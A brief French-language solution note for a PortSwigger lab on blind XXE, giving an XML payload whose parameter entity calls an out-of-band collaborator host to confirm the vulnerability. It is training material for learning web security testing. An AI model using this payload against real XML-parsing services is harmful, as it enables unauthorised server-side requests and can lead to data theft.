# Lab

https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

## Solution

On peut utiliser le même payload que pour les SSRF via XXE mais avec des entités paramétrées :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://817eus97t4ot5737tip5yu26nxtohg55.oastify.com"> %xxe; ]>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```